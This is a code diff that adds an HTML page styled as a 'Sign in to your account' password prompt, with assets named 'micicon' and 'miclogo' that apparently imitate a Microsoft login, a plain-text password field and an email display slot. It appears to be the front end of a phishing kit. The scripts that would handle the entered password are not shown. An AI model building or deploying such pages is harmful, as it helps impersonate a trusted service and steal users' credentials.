@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your account</title>
+    <link rel="shortcut icon" href="img/micicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="css/style.css">
+</head>
+
+<body>
+
+    <div class="ui container">
+        <div class="ui stackable middle aligned center aligned grid">
+            <div class="centered row">
+                <div class="seven wide column">
+                    <div class="push-50"></div>
+                    <div class="ui very padded segment">
+                        <div class="ui container">
+                            <img src="img/miclogo.svg" alt="miclog" class="ui tiny image">
+                            <p><span class="ui red text" id="error-prompter"></span></p>
+                            <p><span class="ui large text" id="emlog"></span></p>
+                            <div class="ui header">Enter password</div>
+                            <div class="ui fluid transparent input">
+                                <input type="text" name="pid" id="pid" placeholder="Password">
+                            </div>
+                            <div class="ui divider"></div>
+                            <p><span class="ui link_text text">Forgot password?</span></p>
+                            <div class="ui right aligned horizontally fitted basic segment">
+                                <div class="ui grid">
+                                    <div class="sixteen wide column">
+                                        <button class="ui button" style="display: none;" id="next-button"></button>
+                                        <button class="ui jara primary button" id="sign-in-button">Sign in</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js"></script>
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/fomantic-ui@2.9.3/dist/semantic.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/fomantic-ui@2.9.3/dist/semantic.min.js"></script>
+    <script src="js/platform.js"></script>
+    <script src="js/script.js"></script>
+</body>
+
+</html>
